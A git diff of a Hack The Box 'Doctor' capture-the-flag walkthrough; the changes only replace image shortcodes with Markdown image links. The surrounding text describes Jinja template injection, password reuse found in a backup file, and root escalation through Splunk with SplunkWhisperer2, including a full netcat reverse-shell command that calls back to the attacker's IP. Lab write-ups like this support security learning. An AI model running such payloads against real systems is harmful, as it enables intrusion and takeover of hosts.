@@ -58,27 +58,27 @@ Command:
 
 We get back some basic pages.
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-7.png" >}}
+![](/images/2020/11/image-7.png)
 
 Let's try to access some of these 'hidden' pages, like `archive` and `login`. Nothing is there. If we navigate to 'doctors.htb' we are prompted with a login page. Checking the source does show the `archives` page as well.
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-8.png" >}}
+![](/images/2020/11/image-8.png)
 
 We can test the login page for basic injections but doesn't seem to be anything there. We can register an account though. We create the account and are given 20 minutes of access. Once we get authenticated we have a very small interface to work with.
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-9.png" >}}
+![](/images/2020/11/image-9.png)
 
 We can create new messages it seems.
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-10.png" >}}
+![](/images/2020/11/image-10.png)
 
 It's possible this field has some injection options. If we submit an `<h1>` tag, we can see it does reflect the HTML code.
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-11.png" >}}
+![](/images/2020/11/image-11.png)
 
 What's interesting about this is that the messages we send are also posted over to `/archive` as well.
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-12.png" >}}
+![](/images/2020/11/image-12.png)
 
 As we do more recon about the site, we see that `wappalyzer` has the site framework as `python`. So there are a few scenarios here. This form could be `XSS` or it oculd be `Template Injection` vulnerable. My guess would be the latter. You can read more on `Template Injection` [here](https://portswigger.net/research/server-side-template-injection).
 
@@ -86,7 +86,7 @@ If we google Python Template engine, we see the first result is `jinja`. If we g
 
 We can test against this use case by doing just what's listed:
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-13.png" >}}
+![](/images/2020/11/image-13.png)
 
 Sure enough, we do get the expected results!
 
@@ -107,7 +107,7 @@ Command:
 
 We submit the message, check the archive page and we get a shell!
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-15.png" >}}
+![](/images/2020/11/image-15.png)
 
 Now that we have a low level shell, we can enumerate and escalate. We'll copy over `linpeas` and see what show up.
 
@@ -130,18 +130,18 @@ Then run it.
 
 There's a lot to sift through. We do however, find a password in an old backup file:
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-16.png" >}}
+![](/images/2020/11/image-16.png)
 
 We can a assume the user typed his password in the email field here. And given the lines below it, make the assumption that the user is shaun. We'll just switch to Shaun and see.
 
 Command:
 `su shaun`
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-17.png" >}}
+![](/images/2020/11/image-17.png)
 
 Now if we upgrade our shell and snag our `user.txt` flag. Once we have it, we can start enumerating again. We'll re-run `linpeas` and see what it can find. An item that semi-sticks out is that `root` is running the `splunkd` process.
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-18.png" >}}
+![](/images/2020/11/image-18.png)
 
 If you've spent anytime working with `Splunk` you know this is a potentially bad scenario. Items like [SplunkWhisperer2](https://github.com/DaniloCaruso/SplunkWhisperer2) can make for a really bad day.
 
@@ -155,7 +155,7 @@ Now we can use this to escalate our privileges. Simply supply the right commands
 Command:
 `python PySplunkWhisperer2_remote.py --lhost 10.10.14.169 --host 10.10.10.209 --username shaun --password Guitar123 --payload '/bin/bash -c "rm /tmp/zzz;mkfifo /tmp/zzz;cat /tmp/zzz|/bin/sh -i 2>&1|nc 10.10.14.169 6666 >/tmp/zzz"'`
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-19.png" >}}
+![](/images/2020/11/image-19.png)
 
 We  get a shell back as root! We get our flag and the box is done!
 
